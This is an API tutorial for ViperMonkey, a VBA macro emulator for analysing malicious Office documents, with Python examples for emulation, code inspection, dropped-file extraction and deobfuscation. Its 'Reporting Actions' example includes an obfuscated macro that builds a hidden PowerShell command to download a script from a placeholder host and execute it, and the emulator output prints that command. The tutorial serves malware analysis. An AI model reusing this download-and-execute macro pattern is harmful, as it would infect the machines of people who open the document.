# API Tutorial

ViperMonkey includs a a python API interface that can be used for
 finer control emulation of your sample or for integration 
 into an existing project.
 
This API allows you to traverse and emulate portions of the VBA code and takes an on-demand approach to parsing for increased speed.

## TOC
- [Direct VBA Emulation](#direct-vba-emulation)
- [Inspecting VBA Code](#inspecting-vba-code)
    - [Code Blocks](#code-blocks)
    - [Evaluating Code Blocks](#evaluating-code-blocks)
    - [Common CodeBlock/VBA_object types](#common-codeblockvba_object-types)
- [Extracting Dropped Files](#extracting-dropped-files)
- [Replacing Functions](#replacing-functions)
- [Reporting Actions](#reporting-actions)
- [Improving Speed](#improving-speed)
- [Deobfuscation](#deobfuscation)



## Direct VBA Emulation
The simplest way to emulate some code is to use the `vipermonkey.eval()` function. 
This parses and emulates each lins, returning the result of the last line.

```python
import vipermonkey

print vipermonkey.eval('"w" & Chr(111) & "rl" & Chr(123 Xor 31)')

vba_code = '''
Dim m1, m2, m3 As String
m1 = "he" & "ll" & Chr(111) & " "
m2 = "w" & Chr(111) & "rl" & Chr(123 Xor 31)
m3 = "!!!"
m1 & m2 & m3
'''

print vipermonkey.eval(vba_code)
```
```
world
hello world!!!
```

If the code doesn't return anything on the last line or you would like to inspect other variables you can provide a `Context` object.

The `Context` object is used to hold all local/global variables, created file objects, and unique actions performed (more on that later).

```python
import vipermonkey

vba_code = '''
Dim m1, m2, m3, result As String
m1 = "he" & "ll" & Chr(111) & " "
m2 = "w" & Chr(111) & "rl" & Chr(123 Xor 31)
m3 = "!!!"
result = m1 & m2 & m3
'''

context = vipermonkey.Context()
vipermonkey.eval(vba_code, context=context)

print context.locals
print context['result']  # same as context.locals['result']
```
```
{'m1': 'hello ', 'result': 'hello world!!!', 'm3': '!!!', 'm2': 'world'}
hello world!!!
```

## Inspecting VBA Code
Parsing source code is an expensive operation. Therefore, Vipermonkey also has the ability,through the use of the `Module` object, to inspect the functions and subroutines within a module without triggering the parsing of the code contained within.

For a `Module` type object you can access the VBA procedures with `.procedures`, `.functions`, `.subs`, or `.entry_points` attributes and determine their names without triggering the parsing of their content.

`.procedures` is the combination of `.functions` and `.subs`.
`.entry_points` provides a list of procedures in the module that are usually triggered by the Office document (e.g. Document_Open).

```python
import vipermonkey

vba_code = '''
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"

Sub Document_Open()
    On Error Resume Next
    Dim message As String
    message = PrintHello("Jamie")
    MsgBox message
End Sub

Function PrintHello(person As String) As String
    Dim m1 As String
    m1 = "he" & "ll" & Chr(111) & " "
    PrintHello = m1 & person
End Function
'''

module = vipermonkey.Module(vba_code)

print 'FUNCTIONS and SUBS: '
for func in module.procedures:
    print func.name
```
```
FUNCTIONS and SUBS: 
Document_Open
PrintHello
```

### Code Blocks
The `Module` object is a type of `CodeBlock` object. A "code block" is any logical chunk of code that works as a unit (e.g. functions, subroutines, for loops, single lines, etc). Every `CodeBlock` object can have zero or more "code blocks" embedded within it, which can be iterated using the `.code_blocks` attribute.

*NOTE: A `CodeBlock` is technically a wrapper around the `VBA_Object` class so it can provide a more on-demand approach to retrieving parsed attributes. The words "code block" and "object" will be used interchangeably because of this.*

- The `Module` object is the top level code block.
- Each code block has different attributes based on the type (which can be determined using the `.type` attribute)
- The original code for the given code block can be accessed using `str()`

```python
for code_block in module.code_blocks:
    print "TYPE: ", code_block.type
    print "CODE:\n", str(code_block)
    if code_block.type == vipermonkey.Function:
        print "Found a function: {}({})".format(
            code_block.name, ', '.join(p.name for p in code_block.params))
```
```
TYPE:  <class 'vipermonkey.core.statements.Attribute_Statement'>
CODE:
Attribute VB_Name = "ThisDocument"

TYPE:  <class 'vipermonkey.core.statements.Attribute_Statement'>
CODE:
Attribute VB_Base = "1Normal.ThisDocument"

TYPE:  <class 'vipermonkey.core.procedures.Sub'>
CODE:
Sub Document_Open()
    On Error Resume Next
    Dim message As String
    message = PrintHello("Jamie")
    MsgBox message
End Sub

TYPE:  <class 'vipermonkey.core.procedures.Function'>
CODE:
Function PrintHello(person As String) As String
    Dim m1 As String
    m1 = "he" & "ll" & Chr(111) & " "
    PrintHello = m1 & person
End Function

Found a function: PrintHello(person)
```

Notice that none of the code within the functions were parsed. This on purpose to provide on-demand parsing which speeds up processing. To parse a function you need to retrieve the code block for that function and then iterate the code blocks inside of it.
```python
for code_block in module.code_blocks:
    if code_block.type == vipermonkey.Function:
        for inner_code_block in code_block.code_blocks:
            print "TYPE: ", inner_code_block.type
            print "CODE:\n", str(inner_code_block)
```
```
TYPE:  <class 'vipermonkey.core.statements.Dim_Statement'>
CODE:
    Dim m1 As String

TYPE:  <class 'vipermonkey.core.statements.Let_Statement'>
CODE:
    m1 = "he" & "ll" & Chr(111) & " "

TYPE:  <class 'vipermonkey.core.statements.Let_Statement'>
CODE:
    PrintHello = m1 & person
```

### Evaluating Code Blocks
Individual code blocks can be evaluated using the `eval()` or `load_context()` function. 
These function accept a `Context` object as a parameter. When evaluated all embedded code blocks will recursively be evaluated. 

`eval()` runs the code block with the correct scope and returns any result if appropriate. All side effects are applied to the provided context. Providing a context for `eval()` is optional.

For example, you can iterate through the code blocks of the module to find the `PrintHello` function
and then evaluate it with your own parameters.

```python
for code_block in module.code_blocks:
    if code_block.type == vipermonkey.Function and code_block.name == 'PrintHello':
        print code_block.eval(params=['Bob'])
```

```
hello Bob
```


`load_context()` evaluates the contents of the code block directly in the scope of the given context, which
allows you to inspect the context afterwards.
 
 `load_context()` is equivalent to evaluating each sub code block individually:
 ```python
for sub_code_block in code_block.code_blocks:
    sub_code_block.eval(context=context)
``` 

When using this function on a `Module` object, the functions and subs are declared without evaluating
 the loose lines outside of it.

*(Using the `module` already declared above)*
```python
context = vipermonkey.Context()
module.load_context(context)

print vipermonkey.eval('PrintHello("Bob")', context=context)
```
```
hello Bob
```


### Common CodeBlock/VBA_Object types
Below is a list of some the common `CodeBlock` (or `VBA_Object`) types you will encounter. 

*NOTE: This is not a complete list, for more information on a code block type please review the ViperMonkey source code or wrap the code block in question with `help()`*


#### Module
The top level code block. Contains all the global variables and functions/submodules.
- `.functions` - Code blocks for Functions
- `.subs` - Code blocks for Subs (These are the same as function but don't return anything)
- `.procedures` - Code blocks for both Functions and Subs
- `.entry_points` - The Functions/Subs that are entry points for the macro ("Document_Open", "AutoOpen", etc)
- `.global_vars` - Dictionary of global variables and their values found within the module
- `.attribute` - Dictionary of macro attributes

#### Function/Sub
- `.name` - Name of the Function or Sub
- `.params` - list of Parameter objects
- `.return_type` - var type the function returns (only for Function)

#### Call_Statement/Function_Call
Calls a given function. Can be found on its own line (Call_Statement) or part of another line.
```
PrintHello("Bob")
Shell "powershell.exe ..."
```
- `.name` - The name or object of the function being called.
- `.params` - A list of the parameters passed into the function. (parameters can be strings or other objects)

#### Global_Var_Statement
Declared variables
```
foo = 'bar'
```
- `.name` - name of the variable of being set (can be an object such as MemberAccessExpression)
- `.value` - value being set to the variable (can be an object)

#### Let_Statement
Assignment of a non-object value (The "Let" keyword itself is optional and may be omitted)
```
Let PrintHello = m1 & person
```
- `.name` - name of the variable
- `.expression` - value of the variable being set
- `.index` - optional index into the variable

#### MemberAccessExpression
An expression representing the access of a object attribute or function
```
ThisDocument.Tables(1).Cell(1, 1).Range.Text
```
- `.lhs` - Object of the first member (`ThisDocument`)
- `.rhs` - List of the rest of the members (`[Tables('1'), Cell('1, 1'), 'Range', 'Text']`)


## Extracting Dropped Files
The `Context` object will keep track of created files and can be accessed with the `opened_files` or `closed_files` attributes.

```python
import vipermonkey

vba_code = r'''

Sub WriteFile(data As String)
    Dim a, b, c As String
    a = "Scr"
    b = "ipting" & Chr(46) & "FileSy"
    c = "st" & Chr(69) & "mObject"
    Dim fso As Object
    Set fso = CreateObject(a & b & c)
    Dim Fileout As Object
    Dim url As String
    url = "c:\users\public\" & "documents\hello.txt"
    Set Fileout = fso.CreateTextFile(url, True, True)
    Fileout.Write data
    Fileout.Close
End Sub

WriteFile("This " & "is some" & " file data!")
'''

context = vipermonkey.Context()
vipermonkey.eval(vba_code, context=context)

print context.closed_files
```
```
{'c:\\users\\public\\documents\\hello.txt': 'This is some file data!'}
```

## Replacing Functions
A Function or Sub may be replaced with a Python implemented function. This is useful to help speed up the parsing of a known function or to replace a function that will most likely fail due to its complexity.

To replace a function, update the `Context` object's `global` dictionary with a function that accepts two parameters `context` and `params` and may return a result. 

```python
import base64
import vipermonkey

vba_code = r'''
Public Function Base64Decode(ByVal s As String) As Byte()
    ' Some complex code
End Function

Public Sub Document_Open()
    Dim result As String
    result = Base64Decode("aGVsbG8gd29ybGQh")
Enc Sub
'''

def replaced_base64(context, params):
    return base64.b64decode(params[0])

context = vipermonkey.Context()
module = vipermonkey.Module(vba_code)
# NOTE: The function should be replaced after the context is evaluated by the module. Otherwise the module will replace your function.
module.load_context(context)

context.globals['Base64Decode'] = replaced_base64

document_open = context['Document_Open']
document_open.load_context(context)
print "DECODED DATA: ", context['result']
```
```
DECODED DATA:  hello world!
```

NOTE: Since replacing a Base64 function is so common, this function has already been implemented for you and can be accessed with `vipermonkey.Base64DecodeString`.

## Reporting Actions
During emulation, ViperMonkey records unique and interesting actions would have effects to the external system (e.g. dropped files, command execution, and HTTP requests). These actions can be accessed from the `Context` object's `.actions` attribute.

```python
import vipermonkey

vba_code = r'''
Public Function Execute() As Variant

Dim m1, m2, m3, m4 As String

m1 = "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l" & " " & "-" & "w" & " " & "h" & "i" & "d" & "d" & "e"
m2 = "n" & " -" & "e" & "x" & "e" & "c" & " b" & "y" & "p" & "a" & "s" & "s " & "-" & "c " & Chr(34)
m3 = "$a" & "=" & "Invoke" & "-" & "We" & "bRequest" & " ww" & "w.example.com" & "/" & "scr" & "ipt.txt"
m4 = "; " & "Inv" & "ok" & "e-Expr" & "ession " & "$" & "a" & Chr(34) & ""

Shell m1 & m2 & m3 & m4, vbHide

WinExec "wscript powershell.exe -x run.ps1", 0

End Function

Execute
'''

context = vipermonkey.Context()
vipermonkey.eval(vba_code, context=context)

for description, actions in context.actions.iteritems():
    print description, '===='
    for action in actions:
        print action
```
```
Shell function ====
('Execute Command', 'powershell -w hidden -exec bypass -c "$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a"')
Interesting Function Call ====
('WinExec', ['wscript powershell.exe -x run.ps1', 0])
Interesting Command Execution ====
('Run', 'wscript powershell.exe -x run.ps1')
```

You may also provide your own callback function in the `Context` object to report the action.
```python
def report_shell(action, params=None, description=None):
    if action == 'Execute Command':
        print "FOUND A COMMAND: ", params

context = vipermonkey.Context(report_action=report_shell)
vipermonkey.eval(vba_code, context=context)
```
```
FOUND A COMMAND:  powershell -w hidden -exec bypass -c "$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a"
```

## Improving Speed
Parsing is the most expensive thing ViperMonkey has to do. Therefore, the `CodeBlock` objects have been designed to parse only when an attribute (`.type`, `.name`, `.params`, etc) is accessed or the `eval()` function is called. However, calling `str()` does not trigger a parse. You can take advantage of this to help speed up your processing by skipping uninteresting lines or usable lines.

```python
import re
import vipermonkey

vba_code = '''
Dim SHxPqkwrGNbtKCbuMMuOwkEnjTCFyQYVofmDhUQO As String
Dim HInhBKXjdKldXUzKfBJGXAlBvSvqyiFkewQMeKCj As String
Dim pRFxhIaLPubbdOiMdqXdORFsxSLGEoyqXCaKHNtT As String
Dim uKWKPzXumrqVToeYfOEBgPSGrPxQuHjXJJDWgfTU As String
Dim mIJOHatpQXHVoIHwnThJcipbyvwvJqJeGduHDfgY As String

Dim m1, m2, m3 As String
m1 = "he" & "ll" & Chr(111) & " "
m2 = "w" & Chr(111) & "rl" & Chr(123 Xor 31)
m3 = "!!!"
result = m1 & 2 & m3
'''

context = vipermonkey.Context()
module = vipermonkey.Module(vba_code)

for code_block in module.code_blocks:
    # Skip parsing the large number of unnecessary variable declarations.
    if re.match('Dim [A-Za-z]{40} As String', str(code_block)):
        continue
    code_block.eval(context)

print context['result']
```
```
hello world!!!
```


## Deobfuscation
ViperMonkey includes a deobfuscation utility that can be used to help clean up code before 
emulation. Depending on your sample, this can greatly help speed up parsing. 
To use, pass your code through the `deobfuscate()` function before parsing/emulating.

```python
import vipermonkey


vba_code = '''
ZOOP = Chr(123 Xor 11)
ZOOP = ZOOP & Chr(122 Xor 14)
ZOOP = ZOOP & Chr(109 Xor 4)
ZOOP = ZOOP & Chr(99 Xor 13)
ZOOP = ZOOP & Chr(97 Xor 6) & Chr(34 Xor 12) & Chr(67 Xor 5) & Chr(109 Xor 4)
ZOOP = ZOOP & Chr(109 Xor 1) + Chr(69) + Chr(81 Xor 2)
ZOOP = ZOOP & Chr(107 Xor 18)
'''

print vipermonkey.deobfuscate(vba_code)
```

```
ZOOP = "pting.FilESy"
```

As a shortcut, deobfuscation can also be triggered by setting the `deobfuscate` keyword argument
in `vipermonkey.eval()` or `vipermonkey.Module()`.

```python
vipermonkey.eval(vba_code, deobfuscate=True)

module = vipermonkey.Module(vba_code, deobfuscate=True)
``` 

